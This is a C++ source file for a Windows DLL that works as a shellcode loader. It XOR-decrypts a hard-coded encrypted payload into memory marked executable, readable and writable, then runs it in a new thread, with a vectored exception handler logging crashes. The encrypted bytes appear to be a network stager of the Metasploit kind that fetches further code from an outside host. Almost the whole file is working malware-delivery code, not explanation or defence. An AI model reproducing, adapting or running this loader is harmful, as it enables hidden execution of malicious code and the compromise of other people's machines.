
#include <windows.h>
#include <iostream>
#include <vector>
#include <fstream>
#include <string>
#include <tlhelp32.h>
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <string>
#include <iostream>

static LPVOID g_alloc = nullptr;
static SIZE_T g_allocSize = 0;

LONG WINAPI VehLog(PEXCEPTION_POINTERS ep) {
    if (!ep || !ep->ExceptionRecord) return EXCEPTION_CONTINUE_SEARCH;
    auto& er = *ep->ExceptionRecord;
    if (er.ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
        ULONG_PTR rw = er.ExceptionInformation[0];
        ULONG_PTR addr = er.ExceptionInformation[1];
        std::cerr << "VEH: ACCESS_VIOLATION " << (rw ? "WRITE" : "READ")
            << " faultAddr=0x" << std::hex << addr << std::dec << "\n";
        if (g_alloc) {
            uintptr_t base = (uintptr_t)g_alloc;
            std::cerr << "  allocBase=0x" << std::hex << base << " size=0x" << g_allocSize << std::dec << "\n";
            if (addr >= base && addr < base + g_allocSize)
                std::cerr << "  -> Fault INSIDE allocated region.\n";
            else
                std::cerr << "  -> Fault OUTSIDE allocated region.\n";
        }
        std::cerr << "  ExceptionAddress = 0x" << std::hex
            << (uintptr_t)er.ExceptionAddress << std::dec << "\n";
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

// Exported main_func to be called when DLL is loaded or externally
extern "C" __declspec(dllexport) int main_func()
{
    PVOID vh = AddVectoredExceptionHandler(1, VehLog);

    // Example payload (choose x64/x86 match your build). Replace with any test bytes.
    unsigned char enc[] = "\x9d\x2d\xe2\x93\x94\x89\xbb\x64\x61\x65\x20\x26\x25\x31\x25\x35"
"\x37\x2d\x50\xa5\x01\x29\xfc\x36\x01\x2d\xea\x25\x7c\x29\xfc\x36"
"\x41\x2d\x6e\xc0\x2e\x2b\x3a\x55\xa8\x2d\xea\x05\x34\x29\x46\xa4"
"\xcd\x59\x00\x0b\x66\x4d\x57\x25\xa0\xac\x6c\x36\x65\xa0\x95\x89"
"\x33\x24\x30\x3f\xef\x33\x57\xef\x23\x59\x29\x76\xb4\x07\xf6\x1c"
"\x79\x6e\x63\x78\xe1\x13\x77\x64\x61\xee\xe1\xff\x64\x61\x77\x2c"
"\xe4\xa5\x15\x10\x2c\x60\xa7\xef\x29\x7d\x31\x33\xef\x21\x57\x2d"
"\x60\xb5\x82\x21\x2c\x9e\xbe\x29\x50\xac\x20\xfc\x50\xe9\x3f\x65"
"\xb7\x2d\x50\xb7\xc8\x20\xb6\xad\x6c\x24\x60\xb6\x5c\x81\x02\x95"
"\x2d\x66\x2d\x53\x6c\x24\x4e\xb5\x14\xbd\x39\x33\xef\x21\x53\x2d"
"\x60\xb5\x07\x36\xef\x6d\x3f\x20\xea\x25\x7d\x3e\x65\xb1\x36\xef"
"\x65\xed\x29\x76\xb4\x20\x2f\x25\x39\x3b\x38\x2d\x25\x39\x36\x3d"
"\x20\x3f\x29\xf4\x88\x41\x36\x36\x9e\x85\x39\x36\x3d\x3b\x3f\xef"
"\x73\x8c\x2a\x88\x9b\x9e\x2a\x2c\x50\xbe\x32\x3e\xda\x16\x1e\x0a"
"\x08\x0b\x04\x03\x64\x20\x21\x2c\xe8\x84\x28\xb0\xa6\x2d\x00\x42"
"\x66\x9a\xb4\x24\x37\x89\xf5\x64\x61\x65\x2c\x18\x1e\x08\x1b\x08"
"\x00\x4a\x54\x59\x54\x41\x5f\x33\x08\x0b\x05\x18\x13\x12\x57\x2a"
"\x35\x45\x50\x47\x4a\x51\x4c\x44\x36\x0c\x0f\x41\x50\x5a\x57\x1c"
"\x57\x51\x48\x57\x25\x11\x07\x08\x04\x32\x04\x15\x2f\x08\x03\x4b"
"\x54\x56\x56\x59\x57\x57\x57\x4c\x2a\x2d\x35\x3a\x28\x4d\x57\x08"
"\x08\x0e\x04\x57\x23\x04\x14\x0f\x0e\x4c\x41\x34\x0c\x13\x18\x09"
"\x04\x4a\x50\x44\x55\x4f\x47\x4a\x51\x4b\x51\x57\x37\x00\x11\x05"
"\x13\x0c\x4e\x42\x57\x56\x59\x57\x57\x45\x24\x13\x03\x4e\x46\x57"
"\x50\x4b\x51\x59\x56\x58\x47\x57\x4f\x5d\x57\x77\x3d\x32\x2d\x29"
"\x50\xa5\x2c\x46\xad\x32\x24\x2d\xdb\x5f\x37\x0e\xc3\x61\x77\x64"
"\x61\x9a\xb4\x9f\x6a\x61\x77\x64\x50\x50\x59\x59\x55\x59\x47\x4a"
"\x55\x5c\x4f\x43\x55\x61\x2d\x2c\xe8\xa4\x28\xb0\xa4\xd2\x62\x64"
"\x61\x28\x50\xbe\x37\x32\x1d\x67\x32\x2c\xdb\x20\xed\xfe\xb1\x64"
"\x61\x65\x61\x88\xb1\x89\x0f\x64\x61\x65\x4e\x18\x0e\x00\x42\x07"
"\x07\x0e\x34\x13\x2f\x4c\x40\x31\x03\x15\x35\x47\x03\x35\x1e\x28"
"\x30\x13\x10\x33\x2f\x10\x14\x14\x19\x1f\x52\x0d\x27\x20\x1b\x5d"
"\x19\x02\x0b\x1b\x06\x10\x2f\x2d\x03\x00\x0a\x0f\x54\x0c\x12\x53"
"\x3e\x11\x2f\x46\x2d\x10\x31\x25\x16\x0f\x27\x28\x05\x2d\x43\x1e"
"\x3e\x2e\x2d\x14\x0c\x11\x4f\x10\x11\x3c\x05\x5a\x12\x30\x06\x2f"
"\x59\x2a\x34\x00\x2e\x2e\x28\x3d\x19\x00\x0c\x1f\x29\x3b\x13\x0b"
"\x26\x3f\x2e\x2f\x32\x03\x44\x3d\x20\x29\x57\x24\x29\x16\x20\x21"
"\x36\x65\x29\xfe\xa5\x32\x2d\x25\x39\x28\x50\xbe\x37\x29\xcf\x64"
"\x53\xcd\xe5\x77\x64\x61\x77\x34\x32\x36\x28\xb0\xa6\x8a\x22\x4a"
"\x5a\x9a\xb4\x3f\xed\xa7\x1d\x6e\x3e\x2d\xe8\x86\x0e\x7e\x2d\x36"
"\x09\xe5\x52\x77\x64\x28\xfe\x84\x0b\x61\x20\x2e\x2d\xdb\x02\x22"
"\xff\xe3\x61\x77\x64\x61\x88\xb1\x2c\x54\xa1\x24\x3e\x29\xfe\x95"
"\x2c\x54\xa8\x3a\x55\xa8\x24\x37\x28\xa2\xa3\x5a\x62\x79\x0c\x9b"
"\xb4\xe0\xa1\x02\x7b\x29\xb0\xa5\xe9\x76\x61\x77\x2d\xdb\x33\x94"
"\x54\x85\x61\x77\x64\x61\x88\xb1\x29\x9a\xae\x03\x66\x8a\xdd\x8c"
"\x34\x65\x61\x77\x37\x38\x1d\x24\x3b\x2c\xe8\xa6\xa5\x83\x67\x2d"
"\xa6\xa5\x61\x67\x64\x61\x3e\xde\x39\xc1\x32\x92\x64\x61\x77\x64"
"\x9e\xb0\x29\xe4\x37\x32\x3f\xed\x86\x2d\xe8\x86\x2c\xe8\xad\x2d"
"\xa6\xa5\x61\x57\x64\x61\x3e\xed\x98\x2c\xdb\x65\xf2\xe8\x95\x64"
"\x61\x65\x61\x88\xb1\x29\xf4\xa0\x41\xe0\xa1\x03\xd6\x07\xfc\x63"
"\x29\x64\xa2\xf2\xa4\x14\xa5\x3c\xa2\x3d\x0b\x77\x3d\x28\xb0\xa6"
"\x91\xd0\xc3\x21\x9b\xb4";
        
    SIZE_T len = sizeof(enc);

    // Allocate RWX (or allocate RW and call VirtualProtect to RX after memcpy)
    void* exec = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec) { std::cerr << "VirtualAlloc failed: " << GetLastError() << "\n"; return 1; }
    g_alloc = exec; g_allocSize = len;

    std::cout << "Allocated exec at: " << exec << " len=0x" << std::hex << len << std::dec << "\n";

    char key[] = "aeawdawd";
    size_t key_len = sizeof(key) - 1;
    
    for (size_t i = 0; i < len; i++)
        ((unsigned char*)exec)[i] = enc[i] ^ key[i % key_len];

    // Flush cache
    FlushInstructionCache(GetCurrentProcess(), exec, len);

    // Print memory info
    MEMORY_BASIC_INFORMATION mbi;
    if (VirtualQuery(exec, &mbi, sizeof(mbi))) {
        std::cerr << "MBI: Base=0x" << std::hex << (uintptr_t)mbi.BaseAddress
            << " RegionSize=0x" << mbi.RegionSize
            << " Protect=0x" << mbi.Protect << std::dec << "\n";
    }

    // Execute
    bool useThread = true;
    std::cout << "Calling payload at " << exec << " useThread=" << useThread << "\n";

    DWORD tid;
    if (useThread) {
        HANDLE th = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)exec, nullptr, 0, &tid);
        if (!th) {
            std::cerr << "CreateThread failed: " << GetLastError() << "\n";
        } else {
            WaitForSingleObject(th, INFINITE);
            CloseHandle(th);
        }
    } else {
        typedef void(*fn)();
        fn f = (fn)exec;
        __try { f(); }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            std::cerr << "SEH: exception code 0x" << std::hex << GetExceptionCode() << std::dec << "\n";
        }
    }

    // Cleanup
    VirtualFree(exec, 0, MEM_RELEASE);
    std::cerr << "Memory freed\n";

    RemoveVectoredExceptionHandler(vh);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModuleCall,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
